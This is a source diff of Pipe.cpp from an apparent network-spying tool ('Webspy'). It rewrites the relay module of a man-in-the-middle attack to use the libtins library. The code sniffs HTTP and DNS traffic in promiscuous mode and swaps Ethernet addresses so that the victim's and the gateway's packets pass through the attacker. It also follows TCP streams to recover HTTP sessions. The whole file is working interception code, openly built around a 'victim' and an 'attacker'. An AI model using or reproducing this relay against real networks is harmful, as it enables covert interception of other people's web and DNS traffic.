@@ -1,134 +1,81 @@
 /*
  * Pipe.cpp
  *
- *  Created on: 01/06/2015
- *      Author: Felipe Rodopoulos
+ *  Created on: 10 de ago de 2015
+ *      Author: rodopoulos
  */
 
 #include "Pipe.h"
 
-std::queue<Packet>	Pipe::analyseBuffer;
-TCPAssembler		Pipe::assembler;
-pthread_t			Pipe::assemblerThread;
-pthread_mutex_t 	Pipe::analyserMutex;
-Crafter				Pipe::crafter;
-Renderer*			Pipe::renderer;
-long				Pipe::packetCount = 0;
+using namespace Tins;
 
-Pipe::Pipe(){}
+PacketSender 		Pipe::sender;
+TCPStreamFollower	Pipe::assembler;
+int			 		Pipe::count = 1;
 
-Pipe::~Pipe(){}
+Pipe::Pipe() {}
+Pipe::~Pipe() {}
 
-void Pipe::init(Renderer* rendererPtr){
-	crafter.init(Globals::iface);
-	renderer = rendererPtr;
-
-	/*if(pthread_mutex_init(&analyserMutex, NULL) < 0){
-		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
+void Pipe::init(){
+	sender.default_interface(Globals::iface);
+	pthread_t sniffingThread;
+	if(pthread_create(&sniffingThread, nullptr, connect, nullptr) < 0){
+		std::cerr << "\033[1;31m [Error]"
+					 " Pipe::init ->"
+					 "\033[0m can't create relay thread" << std::endl;
 		exit(EXIT_FAILURE);
 	}
-	if(pthread_create(&analyserThread, nullptr, analyseHTTP, nullptr) < 0){
-		printf("Webspy::Pipe::init > [ERRO] can't init victim relayer thread\n");
-		exit(EXIT_FAILURE);
-	}*/
-
-	if(pthread_create(&snifferThread, nullptr, connect, nullptr) < 0){
-		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
-		exit(EXIT_FAILURE);
-	}
-
 }
 
 void* Pipe::connect(void* args){
-	char filter[] = "tcp port 80 || tcp port 53 || udp port 53";
-	Sniffer sniffer(filter);
-	assembler.config(sniffer.getHandle());
-	if(pthread_create(&assemblerThread, nullptr, initAssembler, nullptr) < 0){
-		printf("Webspy::Pipe::connect > [ERRO] can't init assembler thread\n");
-		exit(EXIT_FAILURE);
-	}
+	std::string filter = "(tcp port 80 || udp port 53 || tcp port 53)";
+	Sniffer sniffer(Globals::iface.name(), MTU, Sniffer::PROMISC, filter);
 
-	printf("Relay is on!\n");
-	sniffer.listen(relay);
+	std::cout << "Relay is on." << std::endl;
+	assembler.follow_streams(sniffer, tcpFollower, httpRecover);
+
 	return nullptr;
 }
 
-void* Pipe::initAssembler(void* args){
-	assembler.start();
-	return nullptr;
-}
+bool Pipe::relay(PDU& packet){
+	EthernetII ether = packet.rfind_pdu<EthernetII>();
+	IP ip = packet.rfind_pdu<IP>();
 
-void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned char* rcvdPacket){
-	if(!header) return;
-	Packet* packet = new Packet(rcvdPacket, header->len);
-	if(!memcmp( packet->ethernet->thaddr, Globals::attacker.mac, 6)){
-		packetCount++;
-		// From victim to gateway
-		if(!memcmp(packet->ethernet->shaddr, Globals::victim.mac->ether_addr_octet,6)){
-			memcpy(packet->ethernet->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
-			memcpy(packet->ethernet->thaddr, Globals::gateway.mac->ether_addr_octet, 6);
-			//printf("[packet] victim -> attacker -> gateway | Len: %d", packet->len);
-			crafter.sendRaw(*packet);
-			//assembler.assembly((pcap_pkthdr*)header, rcvdPacket);
-			if(packet->isHTTP()){
-				pthread_mutex_lock(&analyserMutex);
-				//analyseBuffer.push(*packet);
-				pthread_mutex_unlock(&analyserMutex);
-				//printf(" | HTTP REQUEST");
-			}
-			//printf("\n");
-		// From gateway to victim
-		} else if(!memcmp(packet->ethernet->shaddr, Globals::gateway.mac->ether_addr_octet, 6)
-				&& packet->ip->dst != Globals::attacker.ip){
-			memcpy(packet->ethernet->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
-			memcpy(packet->ethernet->thaddr, Globals::victim.mac->ether_addr_octet, 6);
-			//printf("[ %ld ] gateway -> attacker -> victim | Len: %d", packetCount, packet->len);
-			crafter.sendRaw(*packet);
-			//assembler.assembly((pcap_pkthdr*)header, rcvdPacket);
-			if(packet->isHTTP()){
-				pthread_mutex_lock(&analyserMutex);
-				//analyseBuffer.push(*packet);
-				pthread_mutex_unlock(&analyserMutex);
-				//printf(" | HTTP RESPONSE");
-			}
-			//printf("\n");
+	if(ether.dst_addr() == Globals::attacker.mac){
+		if(ether.src_addr() == Globals::victim.mac){
+			count++;
+			ether.src_addr(Globals::attacker.mac);
+			ether.dst_addr(Globals::gateway.mac);
+			if(packet.size() <= MTU)
+				std::cout << "\033[0;32m[" << count << "]victim > gateway | size: " << packet.size() << "\033[0m" << std::endl;
+			else
+				std::cout << "\033[1;31m[" << count << "]victim > gateway | size: " << packet.size() << "\033[0m" << std::endl;
+			sender.send(ether);
+		} else if(ether.src_addr() == Globals::gateway.mac && ip.dst_addr() != Globals::attacker.ip){
+			ether.src_addr(Globals::attacker.mac);
+			ether.dst_addr(Globals::victim.mac);
+			count++;
+
+			if(packet.size() <= MTU)
+				std::cout << "\033[0;36m[" << count << "]gateway > victim | size: " << packet.size() << "\033[0m" << std::endl;
+			else
+				std::cout << "\033[1;31m[" << count << "]gateway > victim | size: " << packet.size() << "\033[0m" << std::endl;
+			sender.send(ether);
 		}
 	}
+
+	return true;
 }
 
-void* Pipe::analyseHTTP(void* args){
-	while(1==1){
-		if(!analyseBuffer.empty()){
-			/*pthread_mutex_lock(&analyserMutex);
-			Packet packet = analyseBuffer.front();
-			analyseBuffer.pop();
-			pthread_mutex_unlock(&analyserMutex);
-
-			if(HTTP::readMethod((char*) packet.getPayload()) == HTTP_REQ){
-				HTTP* newObject = new HTTP(
-					packet.ip->dst,
-					packet.tcp->dport,
-					packet.getPayload()
-				);
-				if(renderer->isNewSession(newObject)){
-					HTTPSession *session = new HTTPSession(newObject);
-					renderer->addNewSession(session);
-				} else{
-					//HTTPSession* session = renderer->retrieveSession(newObject, HTTP_REQ);
-					HTTPSession* session;
-					session->newRequest(newObject);
-				}
-			} else { // IS RESPONSE
-				//HTTPSession* session = renderer->retrieveSession(newObject, HTTP_RES);
-				HTTPSession* session;
-				session->addRequestResponse(
-					packet.ip->src,
-					packet.tcp->sport,
-					packet.getPayloadLen(),
-					packet.getPayload()
-				);
-			}*/
-		}
-	}
+bool Pipe::httpRecover(TCPStream& stream){
+	std::cout << "[" << stream.id() << "] "
+			  << stream.stream_info().client_addr << ":" << stream.stream_info().client_port
+			  << " -> " << stream.stream_info().server_addr << ":" << stream.stream_info().server_port
+			  << std::endl;
+	return true;
 }
 
+bool Pipe::tcpFollower(TCPStream& stream){
+	std::cout << "Stream" << std::endl;
+	return true;
+}
